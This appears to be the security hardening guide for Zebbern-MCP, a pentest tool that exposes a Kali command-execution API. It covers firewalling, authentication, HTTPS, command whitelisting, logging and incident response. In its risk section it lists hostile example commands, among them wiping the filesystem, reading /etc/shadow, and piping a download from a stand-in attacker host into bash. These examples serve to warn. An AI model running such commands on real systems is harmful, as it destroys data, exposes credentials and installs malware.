# Security Guide

Security considerations and hardening recommendations for Zebbern-MCP.

---

## Security Overview

!!! danger "Critical Warning"

    Zebbern-MCP is a powerful penetration testing tool that provides **unrestricted command execution** on the Kali server.

    **By default, the API has no authentication.**

    Only use this tool:

    - On isolated networks
    - With proper authorization
    - For legitimate security testing

---

## Default Security Posture

| Component | Default State | Risk Level |
|-----------|---------------|------------|
| API Authentication | **None** | 🔴 Critical |
| HTTPS | **Disabled** | 🔴 Critical |
| Command Execution | **Unrestricted** | 🔴 Critical |
| Network Binding | `0.0.0.0` (all interfaces) | 🟠 High |
| SOCKS Proxy (port 1080) | **Exposed when VPN active** | 🟠 High |
| Database Encryption | **None** | 🟡 Medium |

---

## Network Security

### Isolate the Kali VM

**Recommended Network Setup:**

```
┌─────────────────────────────────────────────────────────────────┐
│                     ISOLATED LAB NETWORK                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐        ┌─────────────┐        ┌─────────────┐ │
│  │  Your PC    │        │  Kali VM    │        │   Targets   │ │
│  │             │◄──────►│             │◄──────►│             │ │
│  │ Host-Only   │        │ Host-Only   │        │ Host-Only   │ │
│  │             │        │ + NAT       │        │             │ │
│  └─────────────┘        └─────────────┘        └─────────────┘ │
│                                                                 │
│  NOT connected to:                                              │
│  - Corporate network                                            │
│  - Production systems                                           │
│  - Internet (except for updates)                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Firewall Configuration

**Restrict API Access:**

```bash
# Only allow from specific IP
sudo ufw default deny incoming
sudo ufw allow from 192.168.56.1 to any port 5000
sudo ufw allow from 192.168.56.1 to any port 1080  # SOCKS proxy

# Or specific subnet
sudo ufw allow from 192.168.56.0/24 to any port 5000
sudo ufw allow from 192.168.56.0/24 to any port 1080  # SOCKS proxy

# Enable firewall
sudo ufw enable
```

**Block External Access:**

```bash
# If using NAT, block API port from WAN
sudo iptables -A INPUT -p tcp --dport 5000 -i eth0 -j DROP
```

### Bind to Specific Interface

Edit `kali_server.py` to bind only to host-only interface:

```python
# Instead of
app.run(host="0.0.0.0", port=5000)

# Use specific IP
app.run(host="192.168.56.100", port=5000)
```

---

## API Hardening

### Option 1: Add Basic Authentication

Create a simple authentication middleware:

```python
# In kali_server.py — applies to ALL routes (including blueprints)
from flask import request, jsonify

API_KEY = "your-secure-random-key-here"

@app.before_request
def require_api_key():
    if request.endpoint == "health.health":
        return  # Allow unauthenticated health checks
    key = request.headers.get('X-API-Key')
    if key != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
```

### Option 2: Enable HTTPS

**Generate Self-Signed Certificate:**

```bash
cd /opt/zebbern-kali
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Update kali_server.py:**

```python
if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        ssl_context=('cert.pem', 'key.pem')
    )
```

**Update MCP client:**

```json
{
  "args": ["mcp_server.py", "--server", "https://192.168.1.100:5000"]
}
```

### Option 3: Use SSH Tunnel

Instead of exposing the API directly:

```bash
# On your machine, create SSH tunnel
ssh -L 5000:localhost:5000 kali@192.168.1.100

# Configure MCP to use localhost
{
  "args": ["mcp_server.py", "--server", "http://localhost:5000"]
}
```

---

## Command Execution Safety

### Understand the Risks

The `/api/exec` endpoint allows **any command** to run as root:

```bash
# These are all possible via the API:
rm -rf /
cat /etc/shadow
curl attacker.com/malware | bash
```

### Implement Command Filtering

Add a whitelist of allowed commands:

```python
ALLOWED_COMMANDS = [
    "nmap", "gobuster", "dirb", "nikto", "sqlmap",
    "nuclei", "httpx", "subfinder", "ffuf"
]

def validate_command(command):
    cmd_base = command.split()[0]
    if cmd_base not in ALLOWED_COMMANDS:
        raise ValueError(f"Command {cmd_base} not allowed")
```

### Log All Commands

```python
import logging

logging.basicConfig(
    filename='/var/log/kali-mcp.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def log_command(command, user_ip):
    logging.info(f"Command from {user_ip}: {command}")
```

---

## Credential Security

### Database Protection

The target database is managed in-memory by `core/target_database.py` — there is no on-disk database file by default.

If you add persistent storage in the future, restrict permissions on the database file:

```bash
# Restrict permissions on any persistent database
chmod 600 /opt/zebbern-kali/data/pentest.db
chown root:root /opt/zebbern-kali/data/pentest.db
```

### Encrypt Sensitive Data

Consider encrypting credentials before storage:

```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()  # Store securely!
cipher = Fernet(key)

def encrypt_password(password):
    return cipher.encrypt(password.encode()).decode()

def decrypt_password(encrypted):
    return cipher.decrypt(encrypted.encode()).decode()
```

### Clean Up After Engagements

```bash
# Export data first
curl http://localhost:5000/api/db/export > backup.json

# Then clear in-memory database by restarting the server
sudo systemctl restart kali-mcp
```

---

## Session Security

### SSH Session Keys

SSH keys used for sessions are sensitive:

```bash
# Store keys securely
chmod 600 ~/.ssh/id_rsa
```

### Metasploit Sessions

Active Metasploit sessions provide shell access:

```bash
# Destroy all sessions when done
# Via MCP: msf_session_destroy_all()
```

### Reverse Shell Cleanup

Active listeners can be exploited:

```bash
# List active listeners
curl http://localhost:5000/api/shell/listeners

# Stop all when not needed
curl -X DELETE http://localhost:5000/api/shell/listeners/all
```

---

## Operational Security

### Use Only with Authorization

!!! warning "Legal Compliance"

    Always obtain written authorization before testing:

    - Signed penetration test agreement
    - Defined scope and rules of engagement
    - Emergency contacts
    - Liability coverage

### Document Everything

Use evidence tools to create audit trail:

```python
# Log all actions
evidence_add_note(
    title="Scan Started",
    content="Starting nmap scan on 192.168.1.0/24",
    tags=["audit", "scan"]
)
```

### Time-Limited Access

For external engagements:

```bash
# Create scheduled job to stop service
echo "systemctl stop kali-mcp" | at 18:00
```

### Secure Communication

- Use SSH tunnels for remote access
- VPN into lab networks
- Never expose API to internet

---

## Compliance Considerations

### Data Handling

| Data Type | Retention | Handling |
|-----------|-----------|----------|
| Scan outputs | Duration of engagement | Encrypt, delete after |
| Credentials | Immediate use only | Never store plaintext |
| Screenshots | Until report delivery | Secure storage |
| Evidence | Per agreement | Secure deletion |

### Audit Logging

Enable comprehensive logging:

```python
# Log format for compliance
logging.info(f"""
AUDIT: {
    'timestamp': datetime.now().isoformat(),
    'user': request.remote_addr,
    'action': 'command_execution',
    'command': command,
    'result': 'success/failure'
}
""")
```

---

## Incident Response

### If API is Compromised

1. **Immediately stop service:**
   ```bash
   sudo systemctl stop kali-mcp
   ```

2. **Isolate VM:**
   - Disconnect network
   - Take snapshot for forensics

3. **Review logs:**
   ```bash
   sudo journalctl -u kali-mcp --since "24 hours ago"
   ```

4. **Check for unauthorized access:**
   ```bash
   last
   cat /var/log/auth.log
   ```

5. **Rebuild from clean state:**
   - Restore from known-good snapshot
   - Change all credentials

---

## Security Checklist

Before using Zebbern-MCP:

- [ ] Kali VM is on isolated network
- [ ] Firewall restricts API access
- [ ] HTTPS enabled (or SSH tunnel)
- [ ] API authentication enabled
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Logging enabled
- [ ] Cleanup procedures documented

During engagement:

- [ ] All commands logged
- [ ] Evidence collected properly
- [ ] Sessions tracked
- [ ] Regular saves of progress

After engagement:

- [ ] All sessions destroyed
- [ ] Listeners stopped
- [ ] Database exported and secured
- [ ] VM cleaned or destroyed
- [ ] Evidence delivered securely

---

## Recommended Architecture

### Production Deployment

```
┌─────────────────────────────────────────────────────────────────┐
│                    SECURE DEPLOYMENT                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐      SSH Tunnel      ┌─────────────────────┐ │
│  │  Your PC    │────────────────────►│  Jump Server        │ │
│  │ (VPN only)  │                      │  (hardened)         │ │
│  └─────────────┘                      └──────────┬──────────┘ │
│                                                  │             │
│                                          Isolated│Network     │
│                                                  │             │
│                                       ┌──────────▼──────────┐ │
│                                       │  Kali VM            │ │
│                                       │  - No internet      │ │
│                                       │  - Auth enabled     │ │
│                                       │  - Logging on       │ │
│                                       └─────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
